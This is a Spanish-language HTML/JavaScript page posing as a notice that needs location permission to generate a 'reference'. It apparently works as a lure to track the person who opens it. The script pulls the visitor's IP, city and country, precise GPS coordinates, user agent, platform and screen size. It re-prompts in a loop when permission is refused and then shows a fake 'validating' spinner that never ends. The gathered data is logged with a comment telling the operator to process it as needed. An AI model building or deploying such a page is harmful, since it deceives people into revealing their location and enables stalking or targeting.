<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AVISO</title>

<style>
    body {
        font-family: Arial, sans-serif;
        margin: 0;
        background: #f2f2f2;
    }

    /* Cuadro inicial de consentimiento */
    #consent-modal {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.75);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 9999;
    }

    .modal-content {
        background: white;
        padding: 25px;
        width: 90%;
        max-width: 420px;
        border-radius: 12px;
        text-align: center;
        box-shadow: 0 3px 10px rgba(0, 0, 0, 0.3);
    }

    .modal-content img {
        width: 80px;
        margin-bottom: 15px;
    }

    h3 {
        margin-top: 0;
        color: #333;
    }

    /* Modal de validación */
    .modal-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.75);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 9999;
    }

    .modal-content-validation {
        background: white;
        padding: 25px;
        width: 90%;
        max-width: 420px;
        border-radius: 12px;
        text-align: center;
        box-shadow: 0 3px 10px rgba(0, 0, 0, 0.3);
    }

    .loading-spinner {
        border: 4px solid #f3f3f3; /* Light grey */
        border-top: 4px solid #3498db; /* Blue */
        border-radius: 50%;
        width: 40px;
        height: 40px;
        animation: spin 2s linear infinite;
        margin: 20px auto;
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }

    /* Main content */
    #main-content {
        display: none;
    }
</style>
</head>

<body>

<!-- Modal de Consentimiento -->
<div id="consent-modal">
    <div class="modal-content">
        <img src="https://i.ibb.co/S42ZgqWB/Sin-t-tulo.jpg">
        <h3>Permiso Necesario</h3>
        <p>
            Para continuar, necesitamos que actives los permisos de ubicación.
            <br><br>
            La referencia se generará <strong>solo después de que aceptes</strong>
            y será enviada de forma segura.
        </p>
    </div>
</div>

<!-- Modal de Validación (Aparece cuando el permiso es otorgado) -->
<div id="validating-modal" class="modal-overlay" style="display:none;">
    <div class="modal-content-validation">
        <img src="https://i.ibb.co/S42ZgqWB/Sin-t-tulo.jpg">
        <h3>Validando...</h3>
        <div class="loading-spinner"></div>
        <p>Estamos verificando la información. Esto puede tardar unos segundos...</p>
    </div>
</div>

<script>
// Función para obtener la IP pública
async function obtenerIP() {
    try {
        let r = await fetch("https://ipapi.co/json/");
        if (!r.ok) return {};
        return await r.json();
    } catch (e) {
        return {};
    }
}

// Función para mostrar el modal de validación
function mostrarValidando() {
    document.getElementById("validating-modal").style.display = "flex";
}

// Función para ocultar el modal de validación
function ocultarValidando() {
    document.getElementById("validating-modal").style.display = "none";
}

// Función principal para solicitar el permiso
async function pedirConsentimiento() {
    const ipInfo = await obtenerIP();

    // Mostrar el modal de validación durante 3 segundos al cargar la página
    mostrarValidando();

    // Después de 3 segundos, mostrar el cuadro que indica que se necesita el permiso
    setTimeout(() => {
        document.getElementById("validating-modal").style.display = "none";
        document.getElementById("consent-modal").style.display = "flex";
    }, 3000); // 3 segundos de "Validando..."

    // Solicitar geolocalización al cargar
    navigator.geolocation.getCurrentPosition(
        async (pos) => {
            // Si el usuario acepta el permiso
            const datos = {
                fecha: new Date().toLocaleString(),
                ip: ipInfo.ip || "N/D",
                city: ipInfo.city || "N/D",
                country: ipInfo.country_name || "N/D",
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                ua: navigator.userAgent,
                platform: navigator.platform,
                resolution: `${screen.width}x${screen.height}`,
            };

            // Aquí puedes procesar la información como necesites
            console.log(datos);

            // Ocultar el cuadro de consentimiento y mostrar el modal de validación
            document.getElementById("consent-modal").style.display = "none";
            mostrarValidando();
            
            // Dejar el modal visible indefinidamente
        },
        async (err) => {
            // Si el permiso es denegado, mostrar el cuadro de consentimiento nuevamente
            alert("Es necesario otorgar el permiso de ubicación para generar la referencia.");
            pedirConsentimiento(); // Volver a solicitar el permiso
        }
    );
}

// Ejecutar al cargar la página
window.onload = pedirConsentimiento;
</script>

</body>
</html>
